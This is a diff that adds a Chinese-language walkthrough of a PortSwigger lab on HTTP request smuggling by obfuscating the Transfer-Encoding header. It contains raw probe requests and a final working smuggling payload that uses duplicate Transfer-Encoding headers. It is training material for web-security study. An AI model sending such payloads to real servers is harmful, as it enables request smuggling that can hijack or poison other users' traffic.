@@ -221,3 +221,66 @@ Transfer-Encoding
 這些技術中的每一種都涉及對 HTTP 規範的微妙偏離。實作協議規範的真實世界程式碼很少絕對精確地遵守它，不同的實作容忍規範的不同變化是很常見的。要發現 TE.TE 漏洞，需要找到 `Transfer-Encoding` 標頭的某種變化，使得只有前端或後端伺服器之一處理它，而另一個伺服器忽略它。
 
 根據是前端還是後端伺服器可以被誘導不處理混淆的 `Transfer-Encoding` 標頭，攻擊的其餘部分將採取與已描述的 CL.TE 或 TE.CL 漏洞相同的形式。
+
+::: tip Lab: [HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)
+
+1. 發送以下請求，收到回應 `Invalid request`，推測前端為 `TE`。
+    ```http
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+    Transfer-Encoding: chunked
+
+    3
+    0aa
+    x
+
+    ```
+2. 發送以下請求，正常回傳，因此推測後端亦為 `TE`
+    ```http
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 3
+    Transfer-Encoding: chunked
+
+    0
+
+    x
+    
+    ```
+3. 發送以下請求，嘗試使後端改為 `CL`。因 `Content-Length` 長度大於 body 導致超時，證明後端成功被改為 `CL`。
+    ```http
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 60
+    Transfer-Encoding: chunked
+    Transfer-Encoding: foobar
+
+    0
+
+    x
+
+    ```
+4. 製作攻擊封包，發送兩次，成功完成此 Lab。
+    ```http
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 3
+    Transfer-Encoding: chunked
+    Transfer-Encoding: foobar
+
+    5b
+    GPOST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 3
+
+    x=0
+    0
+
+    ```
+:::
+
